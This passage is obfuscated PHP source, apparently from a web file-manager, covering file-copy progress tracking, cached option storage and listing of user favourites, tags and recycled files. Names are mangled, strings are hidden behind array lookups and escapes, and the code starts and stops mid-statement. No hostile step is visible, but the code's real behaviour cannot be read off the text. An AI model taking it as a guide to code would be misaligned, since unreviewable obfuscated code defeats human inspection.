(!$¾©µÄÓ[$²óÄ–ÒÛ[765]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¾©µÄÓ[$²óÄ–ÒÛ[1721]] == $²óÄ–ÒÛ[1309]) { return; } self::updateTask($¾©µÄÓ); } private static function updateTask(&$ÃŠøÜÔ«) { $—ËÎÏÖ× =& $_SERVER[ÏéâËõ‘]; if ($ÃŠøÜÔ«[$—ËÎÏÖ×[1721]] == $—ËÎÏÖ×[1204] || $ÃŠøÜÔ«[$—ËÎÏÖ×[1721]] == $—ËÎÏÖ×[107]) { if ($ÃŠøÜÔ«[$—ËÎÏÖ×[1715]]) { $ÃŠøÜÔ«[$—ËÎÏÖ×[1718]] = $ÃŠøÜÔ«[$—ËÎÏÖ×[1717]] + $ÃŠøÜÔ«[$—ËÎÏÖ×[1714]]; } } else { if ($ÃŠøÜÔ«[$—ËÎÏÖ×[1721]] == $—ËÎÏÖ×[1310]) { if ($ÃŠøÜÔ«[$—ËÎÏÖ×[1715]] == $—ËÎÏÖ×[1204]) { $ÃŠøÜÔ«[$—ËÎÏÖ×[1718]] = $ÃŠøÜÔ«[$—ËÎÏÖ×[1717]] + $ÃŠøÜÔ«[$—ËÎÏÖ×[1714]] * 0.5; } else { if ($ÃŠøÜÔ«[$—ËÎÏÖ×[1715]] == $—ËÎÏÖ×[107]) { $ÃŠøÜÔ«[$—ËÎÏÖ×[1718]] = $ÃŠøÜÔ«[$—ËÎÏÖ×[1717]] + $ÃŠøÜÔ«[$—ËÎÏÖ×[1713]] * 0.5 + $ÃŠøÜÔ«[$—ËÎÏÖ×[1714]] * 0.5; } } } } $ÃŠøÜÔ«[$—ËÎÏÖ×[1664]] = $ÃŠøÜÔ«[$—ËÎÏÖ×[1718]] / $ÃŠøÜÔ«[$—ËÎÏÖ×[765]]; if ($ÃŠøÜÔ«[$—ËÎÏÖ×[1664]] > 0) { $Æ½ªˆ’ù = timeFloat() - $ÃŠøÜÔ«[$—ËÎÏÖ×[1666]] - $ÃŠøÜÔ«[$—ËÎÏÖ×[1669]]; $ÃŠøÜÔ«[$—ËÎÏÖ×[1670]] = $Æ½ªˆ’ù * (1 - $ÃŠøÜÔ«[$—ËÎÏÖ×[1664]]) / $ÃŠøÜÔ«[$—ËÎÏÖ×[1664]]; } } public function addPath($À£¦†íã) { $¯ìÚ‰³ =& $_SERVER[ÏéâËõ‘]; if (!$À£¦†íã) { return; } $ÆÑì°¸ =& $this->task; $áÈş€î = IO::infoWithChildren($À£¦†íã); $’Šç€á• = $ÆÑì°¸[$¯ìÚ‰³[1722]] ? $ÆÑì°¸[$¯ìÚ‰³[1722]][$¯ìÚ‰³[1723]] : 0; $ÆÑì°¸[$¯ìÚ‰³[1722]] = array($¯ìÚ‰³[1723] => $’Šç€á• + 1, $¯ìÚ‰³[420] => $áÈş€î[$¯ìÚ‰³[32]], $¯ìÚ‰³[84] => $áÈş€î[$¯ìÚ‰³[84]], $¯ìÚ‰³[519] => $áÈş€î[$¯ìÚ‰³[519]] ? $áÈş€î[$¯ìÚ‰³[519]] : $áÈş€î[$¯ìÚ‰³[84]]); if ($áÈş€î[$¯ìÚ‰³[33]] == $¯ìÚ‰³[199]) { $ÆÑì°¸[$¯ìÚ‰³[788]] += 1; } else { $ÆÑì°¸[$¯ìÚ‰³[788]] += $áÈş€î[$¯ìÚ‰³[79]][$¯ìÚ‰³[77]]; if ($áÈş€î[$¯ìÚ‰³[402]]) { $ÆÑì°¸[$¯ìÚ‰³[788]] += $áÈş€î[$¯ìÚ‰³[79]][$¯ìÚ‰³[78]] + 1; } } $ÆÑì°¸[$¯ìÚ‰³[765]] += $áÈş€î[$¯ìÚ‰³[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($øŠëÄ‡é) { } public function sourceAddHashEnd($şàœò) { } public function sourceAddFileStart($î®×–º—) { $€¡¸ĞÌÙ =& $_SERVER[ÏéâËõ‘]; $Ãê“£øŒ =& $this->task; $Ãê“£øŒ[$€¡¸ĞÌÙ[1713]] = $î®×–º—[$€¡¸ĞÌÙ[76]]; $Ãê“£øŒ[$€¡¸ĞÌÙ[1711]] = $î®×–º—[$€¡¸ĞÌÙ[32]]; $Ãê“£øŒ[$€¡¸ĞÌÙ[1069]] = $î®×–º—[$€¡¸ĞÌÙ[32]]; $Ãê“£øŒ[$€¡¸ĞÌÙ[1724]] = $î®×–º—[$€¡¸ĞÌÙ[84]]; $this->update(); } public function sourceAddFileEnd($ğö¥‹Àí) { $ğÔ€ç“® =& $_SERVER[ÏéâËõ‘]; $£°î¤èŠ =& $this->task; $£°î¤èŠ[$ğÔ€ç“®[1718]] += $ğö¥‹Àí[$ğÔ€ç“®[76]]; $£°î¤èŠ[$ğÔ€ç“®[1724]] = $ğö¥‹Àí[$ğÔ€ç“®[84]]; $this->update(1); } public function copyFileStart($İßËš ´, $¾“©Õ½Í, $õªæá¦, $æ¸šÌÌÎ, $‡ÉìşÀ, $”‘¦£Ë) { $…ÕÙ‹Å =& $_SERVER[ÏéâËõ‘]; $ËíĞäÏŞ = $‡ÉìşÀ; if ($ËíĞäÏŞ == $GLOBALS[$…ÕÙ‹Å[1725]]) { $ËíĞäÏŞ = $GLOBALS[$…ÕÙ‹Å[1726]]; } $GLOBALS[$…ÕÙ‹Å[1726]] = $‡ÉìşÀ; $GLOBALS[$…ÕÙ‹Å[1725]] = $”‘¦£Ë; $“Óü ¶Ü =& $this->task; $“Óü ¶Ü[$…ÕÙ‹Å[1711]] = $ËíĞäÏŞ; $“Óü ¶Ü[$…ÕÙ‹Å[1713]] = (int) $İßËš ´->size($¾“©Õ½Í); $“Óü ¶Ü[$…ÕÙ‹Å[1714]] = 0; $“Óü ¶Ü[$…ÕÙ‹Å[1069]] = $…ÕÙ‹Å[12]; $“Óü ¶Ü[$…ÕÙ‹Å[1715]] = $…ÕÙ‹Å[12]; $“Óü ¶Ü[$…ÕÙ‹Å[1716]] = 0; $¬âÜ‚‰ò = $“Óü ¶Ü[$…ÕÙ‹Å[1713]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($“Óü ¶Ü[$…ÕÙ‹Å[399]] . $…ÕÙ‹Å[1727]); if ($¬âÜ‚‰ò && file_exists(get_path_father($æ¸šÌÌÎ))) { Cache::set($“Óü ¶Ü[$…ÕÙ‹Å[399]] . $…ÕÙ‹Å[1727], $æ¸šÌÌÎ); $“Óü ¶Ü[$…ÕÙ‹Å[1684]] = array($…ÕÙ‹Å[1728], $…ÕÙ‹Å[1729]); } $this->update(0, $¬âÜ‚‰ò); } public static function updateCopyLocalFileSize($˜¼¡Ç¨­) { $×ÆÚ¤Åï =& $_SERVER[ÏéâËõ‘]; $Ó¢Êáïº = Cache::get($˜¼¡Ç¨­[$×ÆÚ¤Åï[399]] . $×ÆÚ¤Åï[1727]); if (!$Ó¢Êáïº || !file_exists($Ó¢Êáïº)) { return $˜¼¡Ç¨­; } $˜¼¡Ç¨­[$×ÆÚ¤Åï[1714]] = @filesize($Ó¢Êáïº); $˜¼¡Ç¨­[$×ÆÚ¤Åï[1718]] += $˜¼¡Ç¨­[$×ÆÚ¤Åï[1714]]; self::updateTask($˜¼¡Ç¨­); return $˜¼¡Ç¨­; } public function copyFileEnd($‘÷€Ù±Ò, $ÀáƒöÕ…, $ÌÒÑª¥¯, $ÇÉí¯¡, $Ô¢«×¬ú, $ª•âñß) { $«†”¤Ç½ =& $_SERVER[ÏéâËõ‘]; $Ã©À×·Ê =& $this->task; $Ã©À×·Ê[$«†”¤Ç½[1714]] = $Ã©À×·Ê[$«†”¤Ç½[1713]]; $Ã©À×·Ê[$«†”¤Ç½[1715]] = $«†”¤Ç½[12]; unset($Ã©À×·Ê[$«†”¤Ç½[1684]]); if ($Ô¢«×¬ú == $Ã©À×·Ê[$«†”¤Ç½[1711]]) { $Ã©À×·Ê[$«†”¤Ç½[1717]] += $Ã©À×·Ê[$«†”¤Ç½[1713]]; $Ã©À×·Ê[$«†”¤Ç½[1718]] = $Ã©À×·Ê[$«†”¤Ç½[1717]]; $ô‡·ıúê = 1; if (isset($Ã©À×·Ê[$«†”¤Ç½[1724]]) && $Ã©À×·Ê[$«†”¤Ç½[1724]] == $ÀáƒöÕ…) { $ô‡·ıúê = 0; } $this->update($ô‡·ıúê); } else { $this->update(); $Ã©À×·Ê[$«†”¤Ç½[1714]] = 0; } Cache::remove($Ã©À×·Ê[$«†”¤Ç½[399]] . $«†”¤Ç½[1727]); self::log($«†”¤Ç½[1730] . $ÀáƒöÕ… . $«†”¤Ç½[70] . $ÇÉí¯¡ . $«†”¤Ç½[231] . $Ô¢«×¬ú . $«†”¤Ç½[1731] . $Ã©À×·Ê[$«†”¤Ç½[1711]]); } public function updateFileEnd($‰¿ªÅÖ, $ Şì¤•Õ) { $ˆÏÃø­… =& $_SERVER[ÏéâËõ‘]; $ü•£Ğñ  =& $this->task; $ü•£Ğñ [$ˆÏÃø­…[1711]] = $‰¿ªÅÖ; $ü•£Ğñ [$ˆÏÃø­…[1713]] = $ Şì¤•Õ; $ü•£Ğñ [$ˆÏÃø­…[1717]] += $ Şì¤•Õ; $ü•£Ğñ [$ˆÏÃø­…[1718]] = $ü•£Ğñ [$ˆÏÃø­…[1717]]; $this->update(1); self::log($ˆÏÃø­…[1732] . $‰¿ªÅÖ); } public function sourceModelCopy($ßˆ­¶Ãı) { $·÷Ê›Ë¶ =& $_SERVER[ÏéâËõ‘]; $Ë‰ø¤¡ª = $ßˆ­¶Ãı[0]; $úˆÒçì× = $ßˆ­¶Ãı[1]; $×ûñ¡‡ä =& $this->task; $this->sourceModelCopyFlag = !0; $¿‘õĞ©Í = 0; switch ($Ë‰ø¤¡ª) { case $·÷Ê›Ë¶[572]: $¿‘õĞ©Í = 1; break; case $·÷Ê›Ë¶[575]: $×ûñ¡‡ä[$·÷Ê›Ë¶[1711]] = $úˆÒçì×[$·÷Ê›Ë¶[32]]; break; case $·÷Ê›Ë¶[577]: $¿‘õĞ©Í = intval($ßˆ­¶Ãı[$·÷Ê›Ë¶[380]] * 0.4); break; case $·÷Ê›Ë¶[579]: $¿‘õĞ©Í = intval($ßˆ­¶Ãı[$·÷Ê›Ë¶[380]] * 0.2); break; case $·÷Ê›Ë¶[581]: $¿‘õĞ©Í = intval($ßˆ­¶Ãı[$·÷Ê›Ë¶[380]] * 0.4); break; } $this->update($¿‘õĞ©Í); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ÅŸŞ¹£², $ƒì–­‡”) { $°ñØµ·ã =& $_SERVER[ÏéâËõ‘]; $this->sourceModelCopyFlag = !0; $À­ù‡Ñ˜ = 1; if (isset($ÅŸŞ¹£²[$°ñØµ·ã[79]])) { $À­ù‡Ñ˜ = $ÅŸŞ¹£²[$°ñØµ·ã[79]][$°ñØµ·ã[77]]; $À­ù‡Ñ˜ = $À­ù‡Ñ˜ + $ÅŸŞ¹£²[$°ñØµ·ã[79]][$°ñØµ·ã[78]] + 1; } $this->update($À­ù‡Ñ˜); $this->sourceModelCopyFlag = !1; } public function sourceMove($›‚è±¬à) { $this->sourceRemove($›‚è±¬à, !1); } public function curlProgress($ƒ¸Îø¼“, $ƒ•ÊÚí¤, $ù‹°ÅãÁ, $®•Ô¬¶­, $à¤¸“ğ‡) { $Ú®óÊ” =& $_SERVER[ÏéâËõ‘]; $ÍıÆ¯óÉ =& $this->task; if ($à¤¸“ğ‡ > 0) { $ÍıÆ¯óÉ[$Ú®óÊ”[1069]] = $Ú®óÊ”[1733]; $ÍıÆ¯óÉ[$Ú®óÊ”[1715]] = $Ú®óÊ”[107]; if ($ÍıÆ¯óÉ[$Ú®óÊ”[1713]]) { $ÍıÆ¯óÉ[$Ú®óÊ”[1714]] = $à¤¸“ğ‡; } if ($ÍıÆ¯óÉ[$Ú®óÊ”[1716]]) { $ÍıÆ¯óÉ[$Ú®óÊ”[1714]] = $à¤¸“ğ‡ + $ÍıÆ¯óÉ[$Ú®óÊ”[1716]]; } } else { if ($ù‹°ÅãÁ > 0) { if ($ÍıÆ¯óÉ[$Ú®óÊ”[1713]] == $ƒ•ÊÚí¤) { $ÍıÆ¯óÉ[$Ú®óÊ”[1714]] = $ù‹°ÅãÁ; $ÍıÆ¯óÉ[$Ú®óÊ”[1069]] = $Ú®óÊ”[1734]; $ÍıÆ¯óÉ[$Ú®óÊ”[1715]] = $Ú®óÊ”[1204]; } } } $this->update(); } public function curlProgressStart($¶ÌüÚœ) { } public function curlProgressEnd($Ÿ·Ò¾Ù¹) { $î´â¾°ù =& $_SERVER[ÏéâËõ‘]; $…õ‰µÅ² =& $this->task; $ãïêù‰’ = curl_getinfo($Ÿ·Ò¾Ù¹); $‚¥›‹‡Ø = $ãïêù‰’[$î´â¾°ù[1735]]; if ($‚¥›‹‡Ø == -1) { $‚¥›‹‡Ø = $ãïêù‰’[$î´â¾°ù[1736]]; } if ($…õ‰µÅ²[$î´â¾°ù[1715]] == $î´â¾°ù[107] && $‚¥›‹‡Ø) { $…õ‰µÅ²[$î´â¾°ù[1716]] += $‚¥›‹‡Ø; } $this->update(); } } goto B§ÛùæÎœ´; A› Óí¢è´: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($¦İ„×·× = false, $º¹š¬û = '', $Í“ŸäÎ = false) { $¤»ŞĞ¿ =& $_SERVER[ÏéâËõ‘]; $À¿çşà = $this->cacheGet($º¹š¬û); $Õö÷Ö‚î = $this->optionDefault($º¹š¬û); $Õö÷Ö‚î = is_array($Õö÷Ö‚î) ? $Õö÷Ö‚î : array(); if (is_array($À¿çşà)) { $À¿çşà = array_merge($Õö÷Ö‚î, $À¿çşà); return $¦İ„×·× ? isset($À¿çşà[$¦İ„×·×]) ? $À¿çşà[$¦İ„×·×] : null : $À¿çşà; } $Ø„İš²‹ = $this->filterWhere(array($¤»ŞĞ¿[33] => $º¹š¬û)); $À¿çşà = $this->where($Ø„İš²‹)->select(); $À¿çşà = array_to_keyvalue($À¿çşà, $¤»ŞĞ¿[94], $¤»ŞĞ¿[374]); foreach ($À¿çşà as $Áºø«»® => $´‘€ºÕç) { if ($Í“ŸäÎ || in_array($Áºø«»®, $this->jsonField)) { $À¿çşà[$Áºø«»®] = json_decode($´‘€ºÕç, !0); } } $this->cacheSet($º¹š¬û, $À¿çşà); $À¿çşà = array_merge($Õö÷Ö‚î, $À¿çşà); return $¦İ„×·× ? $À¿çşà[$¦İ„×·×] : $À¿çşà; } public function set($¿ô×Öê¨, $˜Šäİ²Ó = false, $°…Ò¦œ€ = '') { $œ†éÏµä =& $_SERVER[ÏéâËõ‘]; $this->cacheRemove($°…Ò¦œ€); $Àˆ¯ù¯ = array(); $ÙÄ¯äœ = is_array($¿ô×Öê¨) ? $¿ô×Öê¨ : array($¿ô×Öê¨ => $˜Šäİ²Ó); foreach ($ÙÄ¯äœ as $ÑÖÙâ¿ö => $Ü¼®é½¦) { if (is_array($Ü¼®é½¦)) { $Ü¼®é½¦ = json_encode_force($Ü¼®é½¦); } $this->checkLength($Ü¼®é½¦, !1, $this->tableName . $œ†éÏµä[4] . $¿ô×Öê¨); $Ü¼®é½¦ = self::textEncode($Ü¼®é½¦); $ÙÄ¯äœ = array($œ†éÏµä[33] => $°…Ò¦œ€, $œ†éÏµä[94] => $ÑÖÙâ¿ö, $œ†éÏµä[374] => $Ü¼®é½¦); $Àˆ¯ù¯[] = $this->filterWhere($ÙÄ¯äœ); } if (!$Àˆ¯ù¯) { return !0; } $µ¡øí£˜ = $this->cacheKey($œ†éÏµä[400]); CacheLock::lock($µ¡øí£˜); $Âğ¥Ê¬Š = $this->addAll($Àˆ¯ù¯, array(), !0); CacheLock::unlock($µ¡øí£˜); return $Âğ¥Ê¬Š; } protected function optionDefault($¨Ò‡’˜– = '') { return !1; } public function setDeep($õŒùØêâ, $Üª¿ò®´ = false, $íÅˆ½îØ = '') { $³õ‹¥ó = explode($_SERVER[ÏéâËõ‘][10], $õŒùØêâ); $¥“Ò¦¥ù = $this->get(); array_set_value($¥“Ò¦¥ù, $õŒùØêâ, $Üª¿ò®´); $this->set($³õ‹¥ó[0], $¥“Ò¦¥ù[$³õ‹¥ó[0]], $íÅˆ½îØ); } public function remove($á„ûäş, $ êø±å· = '') { $†Ê¹ò›¹ =& $_SERVER[ÏéâËõ‘]; $this->cacheRemove($ êø±å·); $óˆ”ÄÌ¢ = $this->filterWhere(array($†Ê¹ò›¹[94] => $á„ûäş, $†Ê¹ò›¹[33] => $ êø±å·)); if (is_null($á„ûäş)) { unset($óˆ”ÄÌ¢[$†Ê¹ò›¹[94]]); } return $this->where($óˆ”ÄÌ¢)->delete(); } public function cacheSet($”›íô¡Ì, $ĞŠœöÍ = false) { return Cache::set($this->cacheKey($”›íô¡Ì), $ĞŠœöÍ); } public function cacheGet($öû‚É—Ä) { return Cache::get($this->cacheKey($öû‚É—Ä)); } public function cacheRemove($™¤é¾…) { return Cache::remove($this->cacheKey($™¤é¾…)); } protected function filterWhere($åÊ‹¡‰) { return $åÊ‹¡‰; } protected function cacheKey($×¡°â†Õ) { return $×¡°â†Õ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\x72\143\x65"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\141\155\x65" => "\x69\x6f\137\163\x6f\x75\x72\x63\x65\137\155\x65\164\141", "\x6d\x65\x74\x61\106\x69\145\154\x64" => "\163\x6f\x75\162\x63\145\111\104"); protected $dataAuto = array(array("\155\x6f\144\151\x66\x79\x54\x69\x6d\145", "\x74\x69\155\145", "\151\x6e\163\x65\162\x74", "\x66\165\x6e\x63\x74\x69\x6f\156"), array("\143\162\145\141\164\x65\x54\x69\x6d\x65", "\164\151\155\145", "\151\x6e\x73\x65\x72\x74", "\x66\165\156\143\164\151\157\x6e"), array("\166\151\x65\x77\x54\151\x6d\x65", "\x74\x69\155\x65", "\151\156\x73\x65\x72\x74", "\x66\x75\x6e\x63\x74\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($¦øê™Ãï) { return $this->listSource(array($_SERVER[ÏéâËõ‘][401] => $¦øê™Ãï)); } public function typeName($ô‡ê¦şš) { static $¤şÂòê¶ = array(self::TYPE_SYSTEM => "\x73\171\163\164\145\x6d", self::TYPE_USER => "\165\163\x65\x72", self::TYPE_GROUP => "\147\x72\x6f\165\x70"); return $¤şÂòê¶[$ô‡ê¦şš . $_SERVER[ÏéâËõ‘][12]]; } public function sourceListInfo($º‚÷í“, $“·µ¸¹° = false) { $ÛÖ§­”á =& $_SERVER[ÏéâËõ‘]; $º‚÷í“ = $º‚÷í“ ? $º‚÷í“ : array(); $º‚÷í“ = array_filter(array_unique($º‚÷í“)); if (!$º‚÷í“) { return array(); } $†Œû¸¡™ = $this->where(array($ÛÖ§­”á[402] => array($ÛÖ§­”á[7], $º‚÷í“)))->select(); $this->_listDataApply($†Œû¸¡™, $“·µ¸¹°); return array_to_keyvalue($†Œû¸¡™, $ÛÖ§­”á[402]); } public function pathInfoFilter(&$ıÎ—®ò) { $‚ŒÂëˆŸ =& $_SERVER[ÏéâËõ‘]; static $®²ëªÏ = false; static $Æ­ÆÅ´× = false; static $Ùå£ò†œ = false; if (!$®²ëªÏ) { $£ññœğ = $‚ŒÂëˆŸ[403]; $£ññœğ .= $‚ŒÂëˆŸ[404]; $£ññœğ .= $‚ŒÂëˆŸ[405]; $Öª¬ÈŒ› = $‚ŒÂëˆŸ[406]; $ªí›Ïş  = explode($‚ŒÂëˆŸ[50], $Öª¬ÈŒ›); $®²ëªÏ = explode($‚ŒÂëˆŸ[50], $£ññœğ); $Æ­ÆÅ´× = array(); foreach ($®²ëªÏ as $Š§¼÷íœ) { if (in_array($Š§¼÷íœ, $ªí›Ïş )) { continue; } $Æ­ÆÅ´×[] = $Š§¼÷íœ; } $Ùå£ò†œ = explode($‚ŒÂëˆŸ[50], $‚ŒÂëˆŸ[407]); } foreach ($Ùå£ò†œ as $ĞÌ—Ìâ) { if (isset($ıÎ—®ò[$ĞÌ—Ìâ])) { $ıÎ—®ò[$ĞÌ—Ìâ] = intval($ıÎ—®ò[$ĞÌ—Ìâ]); } } $ıÎ—®ò[$‚ŒÂëˆŸ[84]] = $‚ŒÂëˆŸ[408] . $ıÎ—®ò[$‚ŒÂëˆŸ[402]] . $‚ŒÂëˆŸ[409]; $ıÎ—®ò[$‚ŒÂëˆŸ[33]] = $ıÎ—®ò[$‚ŒÂëˆŸ[410]] == 1 ? $‚ŒÂëˆŸ[75] : $‚ŒÂëˆŸ[199]; $ıÎ—®ò[$‚ŒÂëˆŸ[411]] = $this->typeName($ıÎ—®ò[$‚ŒÂëˆŸ[411]]); if ($ıÎ—®ò[$‚ŒÂëˆŸ[410]] != 1) { $ıÎ—®ò[$‚ŒÂëˆŸ[174]] = $ıÎ—®ò[$‚ŒÂëˆŸ[412]]; unset($ıÎ—®ò[$‚ŒÂëˆŸ[412]]); } $éîÖí¿ = $®²ëªÏ; if (isset($ıÎ—®ò[$‚ŒÂëˆŸ[413]]) && $ıÎ—®ò[$‚ŒÂëˆŸ[413]][$‚ŒÂëˆŸ[414]] == -1) { $éîÖí¿ = $Æ­ÆÅ´×; } $ıÎ—®ò = array_field_key($ıÎ—®ò, $éîÖí¿); return $ıÎ—®ò; } public function listUserFav() { $ïÛĞæ²Û =& $_SERVER[ÏéâËõ‘]; $à––¥µ« = Model($ïÛĞæ²Û[415])->listData(); $ ¨Ò åÌ = array_filter_by_field($à––¥µ«, $ïÛĞæ²Û[33], $ïÛĞæ²Û[416]); $ ¨Ò åÌ = array_to_keyvalue($ ¨Ò åÌ, $ïÛĞæ²Û[12], $ïÛĞæ²Û[84]); if ($ ¨Ò åÌ) { $Á¯ÉÖÎû = $this->listSource(array($ïÛĞæ²Û[417] => array($ïÛĞæ²Û[418], $ ¨Ò åÌ))); } $Á¯ÉÖÎû = array_to_keyvalue($Á¯ÉÖÎû[$ïÛĞæ²Û[369]], $ïÛĞæ²Û[402]); foreach ($à––¥µ« as &$¡ï…’·ç) { $¡ï…’·ç = array($ïÛĞæ²Û[419] => $¡ï…’·ç[$ïÛĞæ²Û[399]], $ïÛĞæ²Û[420] => $¡ï…’·ç[$ïÛĞæ²Û[32]], $ïÛĞæ²Û[421] => $¡ï…’·ç[$ïÛĞæ²Û[84]], $ïÛĞæ²Û[422] => $¡ï…’·ç[$ïÛĞæ²Û[33]], $ïÛĞæ²Û[423] => $¡ï…’·ç[$ïÛĞæ²Û[200]], $ïÛĞæ²Û[424] => $¡ï…’·ç[$ïÛĞæ²Û[85]]); if ($¡ï…’·ç[$ïÛĞæ²Û[33]] == $ïÛĞæ²Û[416] && $Á¯ÉÖÎû[$¡ï…’·ç[$ïÛĞæ²Û[84]]]) { $¡ï…’·ç[$ïÛĞæ²Û[86]] = $Á¯ÉÖÎû[$¡ï…’·ç[$ïÛĞæ²Û[84]]]; } } unset($¡ï…’·ç); return $à––¥µ«; } public function listUserTag($¨²ç¾÷à) { $Å¤ÕÎŸè =& $_SERVER[ÏéâËõ‘]; if ($¨²ç¾÷à && !is_array($¨²ç¾÷à)) { $¨²ç¾÷à = array($¨²ç¾÷à); } $ºè¤… = Model($Å¤ÕÎŸè[425])->listData(); $€ßÊ•¢¼ = array(); $«´¥¡ÜØ = array(); foreach ($ºè¤… as $ƒÚÍŠıı) { $şßÊàÈ½ = $ƒÚÍŠıı[$Å¤ÕÎŸè[84]]; if (!$şßÊàÈ½) { continue; } if (!isset($«´¥¡ÜØ[$şßÊàÈ½])) { $«´¥¡ÜØ[$şßÊàÈ½] = array(); } $«´¥¡ÜØ[$şßÊàÈ½][] = $ƒÚÍŠıı[$Å¤ÕÎŸè[426]]; $€ßÊ•¢¼[$ƒÚÍŠıı[$Å¤ÕÎŸè[84]]] = $ƒÚÍŠıı; } $ë÷ÎØùË = array(); $¨ŸÇ = array(); $ŸÓ¹è­¡ = array(); foreach ($«´¥¡ÜØ as $²³Ùêì˜ => $”Ğİ­¹Í) { $úÁ÷ÇÎµ = !0; if (!$¨²ç¾÷à) { $ë÷ÎØùË[] = $²³Ùêì˜; continue; } foreach ($¨²ç¾÷à as $òš˜³³¸) { if (!in_array($òš˜³³¸, $”Ğİ­¹Í)) { $úÁ÷ÇÎµ = !1; break; } } if (!$úÁ÷ÇÎµ) { continue; } if (!is_numeric($²³Ùêì˜)) { $Ë×¬©Ì = $€ßÊ•¢¼[$²³Ùêì˜]; $„¬ßïƒ± = array($Å¤ÕÎŸè[32] => $Ë×¬©Ì[$Å¤ÕÎŸè[32]], $Å¤ÕÎŸè[84] => $Ë×¬©Ì[$Å¤ÕÎŸè[84]], $Å¤ÕÎŸè[33] => $Ë×¬©Ì[$Å¤ÕÎŸè[33]], $Å¤ÕÎŸè[86] => array($Å¤ÕÎŸè[427] => 1), $Å¤ÕÎŸè[201] => !0); if ($Ë×¬©Ì[$Å¤ÕÎŸè[33]] == $Å¤ÕÎŸè[199]) { $ŸÓ¹è­¡[] = $„¬ßïƒ±; } if ($Ë×¬©Ì[$Å¤ÕÎŸè[33]] == $Å¤ÕÎŸè[75]) { $¨ŸÇ[] = $„¬ßïƒ±; } continue; } $ë÷ÎØùË[] = $²³Ùêì˜; } if ($ë÷ÎØùË) { $íìû› = $this->listSource(array($Å¤ÕÎŸè[417] => array($Å¤ÕÎŸè[418], $ë÷ÎØùË))); } $íìû› = $íìû› ? $íìû› : array($Å¤ÕÎŸè[82] => array(), $Å¤ÕÎŸè[83] => array()); $íìû›[$Å¤ÕÎŸè[82]] = array_merge($íìû›[$Å¤ÕÎŸè[82]], $¨ŸÇ); $íìû›[$Å¤ÕÎŸè[83]] = array_merge($íìû›[$Å¤ÕÎŸè[83]], $ŸÓ¹è­¡); if (isset($íìû›[$Å¤ÕÎŸè[366]]) && count($ë÷ÎØùË) == $íìû›[$Å¤ÕÎŸè[366]][$Å¤ÕÎŸè[367]]) { return $íìû›; } $¥’¥ªâ… = array(); $½Âµø¬ = array_to_keyvalue($íìû›[$Å¤ÕÎŸè[82]], $Å¤ÕÎŸè[12], $Å¤ÕÎŸè[402]); $ï¼œ†‰ = array_to_keyvalue($íìû›[$Å¤ÕÎŸè[83]], $Å¤ÕÎŸè[12], $Å¤ÕÎŸè[402]); $·¯í¹ò¨ = array_merge($ï¼œ†‰, $½Âµø¬); foreach ($ë÷ÎØùË as $şßÊàÈ½) { if (!in_array($şßÊàÈ½, $·¯í¹ò¨)) { $¥’¥ªâ…[] = $şßÊàÈ½; } } if ($¥’¥ªâ…) { Model($Å¤ÕÎŸè[428])->removeBySource($¥’¥ªâ…); } return $íìû›; } public function listUserRecycle() { $ıÁ¡Ÿ­Ã =& $_SERVER[ÏéâËõ‘]; $ë˜Ììûæ = Model($ıÁ¡Ÿ­Ã[429])->listData(); if (!$ë˜Ììûæ) { return array(); } $Øù€¹¡Œ = array($ıÁ¡Ÿ­Ã[417] => array($ıÁ¡Ÿ­Ã[418], $ë˜Ììûæ), $ıÁ¡Ÿ­Ã[430] => 1); return $this->listSource($Øù€¹¡Œ); } public function listSource($ÑÃë”€±, $îå›Á—‡ = 3000, $à¹îğò = false) { $êÓå­ØÊ =& $_SERVER[ÏéâËõ‘]; if (!isset($ÑÃë”€±[$êÓå­ØÊ[431]])) { $ÑÃë”€±[$êÓå­ØÊ[431]] = 0; } if (isset($ÑÃë”€±[$êÓå­ØÊ[432]]) && $ÑÃë”€±[$êÓå­ØÊ[432]] == $êÓå­ØÊ[197]) { $ÑÃë”€±[$êÓå­ØÊ[412]] = array($êÓå­ØÊ[331], $êÓå­ØÊ[433]); } $†à©Ñ¶ = $êÓå­ØÊ[434]; $ğ“»Æ›Æ = $this->field($†à©Ñ¶)->_makeOrder()->where($ÑÃë”€±)->selectPage($îå›Á—‡); $this->_listPageCheck($ğ“»Æ›Æ, $†à©Ñ¶, $ÑÃë”€±); $this->_listDataApply($ğ“»Æ›Æ[$êÓå­ØÊ[369]], $à¹îğò); $this->_listMake($ğ“»Æ›Æ); return $ğ“»Æ›Æ; } private function _listPageCheck(&$×¬—“î€, $†ñáàˆ£, $ñŠõÃè‡) { $½Î»Áçè =& $_SERVER[ÏéâËõ‘]; if (!is_array($×¬—“î€[$½Î»Áçè[366]])) { return; } $’Ğ¸ªìĞ = $×¬—“î€[$½Î»Áçè[366]]; if ($’Ğ¸ªìĞ[$½Î»Áçè[368]] <= 1) { return; } if ($’Ğ¸ªìĞ[$½Î»Áçè[367]] >= 100000) { return; } if (Model($½Î»Áçè[435])->get($½Î»Áçè[436]) != $½Î»Áçè[437]) { return; } $†ñáàˆ£ = str_replace(array($½Î»Áçè[53], $½Î»Áçè[342], $½Î»Áçè[231]), $½Î»Áçè[12], $†ñáàˆ£); $†ñáàˆ£ = $½Î»Áçè[438] . str_replace($½Î»Áçè[50], $½Î»Áçè[439], $†ñáàˆ£) . $½Î»Áçè[440]; $ê¦­±Õ = $½Î»Áçè[441]; $ê¦­±Õ = $ê¦­±Õ . $½Î»Áçè[442]; $é¸ãÊšö = $’Ğ¸ªìĞ[$½Î»Áçè[363]] * ($’Ğ¸ªìĞ[$½Î»Áçè[353]] - 1) . $½Î»Áçè[50] . $’Ğ¸ªìĞ[$½Î»Áçè[363]]; $åÉµªÀ‹ = $this->_makeOrder(!0); $ì™¾«Ü¥ = $½Î»Áçè[438] . str_replace($½Î»Áçè[50], $½Î»Áçè[439], $åÉµªÀ‹[0]); if (strpos($ì™¾«Ü¥, 